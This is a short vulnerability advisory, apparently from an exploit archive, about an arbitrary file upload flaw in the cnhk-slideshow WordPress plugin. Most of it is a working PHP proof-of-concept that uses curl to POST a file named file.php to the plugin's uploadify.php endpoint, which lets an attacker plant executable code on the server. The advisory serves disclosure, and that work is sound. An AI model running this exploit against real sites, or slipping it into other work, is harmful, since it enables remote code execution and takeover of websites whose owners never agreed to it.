source: http://www.securityfocus.com/bid/67469/info

The cnhk-slideshow plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application. 

<?php
$uploadfile="file.php";
$ch = curl_init("
http://localhost/wp-content/plugins/cnhk-slideshow/uploadify/uploadify.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('slideshow'=>"@$uploadfile"));
curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);
print "$result";
?>